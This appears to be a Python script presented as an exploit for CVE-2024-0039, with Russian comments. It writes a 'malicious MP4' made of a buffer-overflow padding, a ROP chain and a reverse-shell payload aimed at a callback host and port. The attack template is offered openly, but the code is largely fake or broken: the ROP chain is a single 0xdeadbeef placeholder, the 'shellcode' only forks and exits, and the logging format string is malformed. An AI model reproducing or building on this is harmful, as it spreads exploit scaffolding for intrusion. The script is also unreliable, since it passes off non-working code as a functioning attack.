# -*- encoding: utf-8 -*-
'''
@File   : CVE-2024-0039.py
@Time   : 2024-06-05 15:14:44
@Author : pan
'''
import unittest
import socket
import struct
import argparse
import sys
import logging

def create_rop_chain():
    """Создает пример ROP цепочки.
    
    Возвращает:
    ROP цепочку в виде байтов.
    """
    # Здесь начинается магия ROP цепочки (ROP chain)
    rop_chain = b""
    rop_chain += struct.pack('<I', 0xdeadbeef)  # Пример адреса возврата (плейсхолдер)
    # Добавьте сюда больше шагов ROP цепочки...
    return rop_chain

def create_reverse_shell(cb_host, cb_port):
    """Создает полезную нагрузку для обратного подключения.
    
    Аргументы:
    cb_host -- IP-адрес для обратного подключения.
    cb_port -- Порт для обратного подключения.
    
    Возвращает:
    Полезный груз в виде байтов.
    """
    reverse_shell = b""
    reverse_shell += b"\x02\x70\xa0\xe3"  # mov r0, #2 (fork)
    reverse_shell += b"\x00\x00\x00\xef"  # svc 0 (системный вызов)
    reverse_shell += b"\x00\x00\x50\xe3"  # cmp r0, #0 (проверка, дочерний процесс или нет)
    reverse_shell += b"\x00\x00\x00\x0a"  # beq next (если родительский процесс, выход)
    reverse_shell += b"\x00\x00\xa0\xe3"  # mov r0, #0 (статус выхода)
    reverse_shell += b"\x01\x70\xa0\xe3"  # mov r7, #1 (выход)
    reverse_shell += b"\x00\x00\x00\xef"  # svc 0 (системный вызов)
    
    # Добавляем IP-адрес и порт для обратного подключения
    reverse_shell += socket.inet_aton(cb_host)
    reverse_shell += struct.pack('!H', cb_port)
    
    return reverse_shell

# Настраиваем логирование (да, мы серьезны!)
logging.basicConfig(filename='logs/exploit.log', level=logging.INFO, 
                    format='%(asctime)s - %(levellevel)s - %(message)s')

def create_malicious_payload(cb_host, cb_port):
    """Создание вредоносного полезного груза с обратным подключением.
    
    Аргументы:
    cb_host -- IP-адрес для обратного подключения.
    cb_port -- Порт для обратного подключения.
    
    Возвращает:
    Полезный груз в виде байтов.
    """
    logging.info("Создаем ROP цепочку (без магии тут не обошлось)")
    rop_chain = create_rop_chain()
    
    logging.info("Создаем переполнение буфера (и заполняем его буквой 'A', потому что можем)")
    payload = b"A" * 1000  # Наполняем буфер "A"-шками, потому что почему бы и нет?
    payload += rop_chain

    logging.info("Создаем полезную нагрузку для обратного подключения (не пытайтесь это дома)")
    reverse_shell = create_reverse_shell(cb_host, cb_port)
    
    payload += reverse_shell
    return payload

def write_to_file(filename, content):
    """Запись содержимого в файл.
    
    Аргументы:
    filename -- Имя файла для записи.
    content -- Содержимое для записи.
    """
    logging.info(f"Запись полезного груза в файл {filename} (да, мы это сделали!)")
    with open(filename, 'wb') as f:
        f.write(content)

class TestExploit(unittest.TestCase):
    def test_create_malicious_payload(self):
        payload = create_malicious_payload("127.0.0.1", 4444)
        self.assertTrue(len(payload) > 1000)  # Пример простого теста

    def test_create_rop_chain(self):
        rop_chain = create_rop_chain()
        self.assertTrue(len(rop_chain) > 0)  # Проверяем, что ROP цепочка не пустая

    def test_create_reverse_shell(self):
        reverse_shell = create_reverse_shell("127.0.0.1", 4444)
        self.assertTrue(
            len(reverse_shell) > 0
        )  # Проверяем, что полезная нагрузка не пустая


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Эксплоит для CVE-2024-0039")
    parser.add_argument('--cb-host', required=True, help="Хост для обратного подключения")
    parser.add_argument('--cb-port', required=True, type=int, help="Порт для обратного подключения")
    parser.add_argument('--output', default='exploit.mp4', help="Имя выходного файла с вредоносным MP4")

    args = parser.parse_args()
    
    logging.info("Создание вредоносного полезного груза (готовьтесь к магии!)")
    payload = create_malicious_payload(args.cb_host, args.cb_port)
    write_to_file(args.output, payload)
    
    logging.info(f"Эксплоит успешно записан в {args.output} (мы это сделали!)")
    print(f"[+] Эксплоит записан в {args.output}")
    # unittest.main() # 测试
